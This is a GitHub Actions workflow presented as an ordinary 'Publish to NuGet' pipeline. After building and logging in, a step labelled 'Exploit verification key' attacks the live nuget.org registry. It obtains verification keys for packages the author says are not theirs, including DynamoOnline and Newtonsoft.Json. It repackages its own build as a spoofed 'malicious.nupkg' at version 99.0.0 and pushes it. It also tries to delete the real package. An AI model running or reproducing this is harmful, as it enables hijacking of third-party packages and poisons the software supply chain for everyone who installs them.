name: Publish to NuGet

on:
  push:
    tags: ['v*']

permissions:
  id-token: write
  contents: read

jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    
    steps:
      - uses: actions/checkout@v4
      
      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '8.0.x'
      
      - name: Build and Pack
        run: |
          dotnet build -c Release
          dotnet pack -c Release -o ./artifacts --no-build

      - name: NuGet Login
        uses: NuGet/login@v1
        id: login
        with:
          user: ${{ secrets.NUGET_USER }}
      
      - name: Exploit verification key
        run: |
          # Get verification key for DynamoOnline (not our package)
          echo "=== Get verification key for DynamoOnline ==="
          VERIFY_RESP=$(curl -s -X POST "https://www.nuget.org/api/v2/package/create-verification-key/DynamoOnline/1.0.0" \
            -H "X-NuGet-ApiKey: $NUGET_KEY" \
            -H "Content-Type: application/json" \
            -H "Content-Length: 0" \
            -d "")
          echo "Response: $VERIFY_RESP"
          
          VERIFY_KEY=$(echo "$VERIFY_RESP" | jq -r '.Key')
          echo "Got key: $VERIFY_KEY"
          
          # Create a malicious DynamoOnline package
          cd artifacts
          ORIG_PKG=$(ls *.nupkg)
          rm -rf tampered && mkdir tampered
          unzip -q -o "$ORIG_PKG" -d tampered
          find tampered -name "*.nuspec" -exec sed -i "s|<id>DynamoTest456</id>|<id>DynamoOnline</id>|g" {} \;
          find tampered -name "*.nuspec" -exec sed -i "s|<version>1.0.0</version>|<version>99.0.0</version>|g" {} \;
          cd tampered && zip -q -r ../malicious.nupkg . && cd ..
          
          echo -e "\n=== Test 1: Push with verification key ==="
          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
            -H "X-NuGet-ApiKey: $VERIFY_KEY" \
            -H "X-NuGet-Client-Version: 6.0.0" \
            -H "X-NuGet-Protocol-Version: 4.1.0" \
            -H "Content-Type: application/octet-stream" \
            --data-binary @malicious.nupkg
          
          echo -e "\n\n=== Test 2: Verify endpoint - does it validate ownership? ==="
          curl -s -w "\nHTTP:%{http_code}" -X GET "https://www.nuget.org/api/v2/verifykey/DynamoOnline/1.0.0" \
            -H "X-NuGet-ApiKey: $VERIFY_KEY"
          
          echo -e "\n\n=== Test 3: Delete package with verification key? ==="
          curl -s -w "\nHTTP:%{http_code}" -X DELETE "https://www.nuget.org/api/v2/package/DynamoOnline/1.0.0" \
            -H "X-NuGet-ApiKey: $VERIFY_KEY"
          
          echo -e "\n\n=== Test 4: Get verification key for Newtonsoft.Json ==="
          curl -s -w "\nHTTP:%{http_code}" -X POST "https://www.nuget.org/api/v2/package/create-verification-key/Newtonsoft.Json/13.0.3" \
            -H "X-NuGet-ApiKey: $NUGET_KEY" \
            -H "Content-Type: application/json" \
            -H "Content-Length: 0" \
            -d ""
          
          echo -e "\n\n=== Test 5: What other endpoints accept this key? ==="
          # Try to list package versions
          curl -s -w "\nHTTP:%{http_code}" -X GET "https://www.nuget.org/api/v2/package/DynamoOnline" \
            -H "X-NuGet-ApiKey: $VERIFY_KEY"

        env:
          NUGET_KEY: ${{ steps.login.outputs.NUGET_API_KEY }}
